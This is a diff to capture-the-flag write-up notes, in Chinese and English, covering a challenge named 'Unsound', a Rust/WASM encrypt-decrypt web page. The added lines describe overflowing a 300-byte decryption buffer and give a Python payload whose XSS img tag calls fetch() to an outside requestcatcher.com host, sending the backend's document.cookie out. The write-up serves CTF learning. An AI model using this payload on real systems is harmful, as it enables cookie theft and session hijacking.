@@ -29,7 +29,22 @@ Server:BaseHTTP/0.6 Python/3.12.2
 选择rw区域并脚本run
 
 ### Unsound
-一个rust写的web页面,可以加密和解密数据,加密在前端,解密在后端且不返回解密得到的数据
+一个rust写的web页面,可以加密和解密数据,加密在前端,解密在后端且不返回解密得到的数据,前端还是wasm,用了wabt结果还反编译不了
+
+---
+1. the decrypt has a C-struct in it with a buffer for the decrypted message of 300bytes; if you overflow this, you'll overwrite the success-message.
+2. payload to encrypt:
+```
+fill_buffer = 'A'*300
+xss_payload = '''<img src=x onerror="fetch('https://matthias.requestcatcher.com/test?c=' + document.cookie,{ method:'GET'})" >'''
+data_to_encrypt = fill_buffer + xss_payload
+```
+存在溢出,让内部服务器触发xss去带出cookie
+
+3. Then decrypt the encrypted stuff and catch the fetch request somehow
+ 
+xss triggers, because if you add the img-tag to the dom, it tries to load the img, fails and thus triggers the js
+you'll receive 2 requests to your server; first is from your local machine, running the wasm; second one (roughly 12 seconds later - when I tested it) was the backend server requesting it
 
 
 # reverse
